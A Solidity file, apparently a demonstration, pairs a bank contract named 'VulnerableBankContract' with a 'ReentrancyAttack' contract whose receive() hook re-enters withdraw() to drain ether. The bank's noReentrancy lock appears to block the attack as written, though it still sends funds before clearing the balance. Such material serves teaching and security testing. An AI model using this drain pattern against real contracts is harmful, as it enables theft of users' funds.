// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract VulnerableBankContract {
    mapping(address => uint) public balances;
    bool locked;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    modifier noReentrancy() {
        require(!locked, "no reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() external noReentrancy {
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function currentBalance() public view returns(uint) {
        return address(this).balance;
    }
}

contract ReentrancyAttack {
    VulnerableBankContract public bank;

    constructor(address bank_contract) {
        bank = VulnerableBankContract(bank_contract);
    }

    function proxyDepositToBank() external payable {
        bank.deposit{value: msg.value}();
    }

    function attackBank() external {
        bank.withdraw();
    }

    receive() external payable {
        if (bank.currentBalance() > 0) {
            bank.withdraw();
        }
    }

     function currentBalance() public view returns(uint) {
        return address(this).balance;
    }
}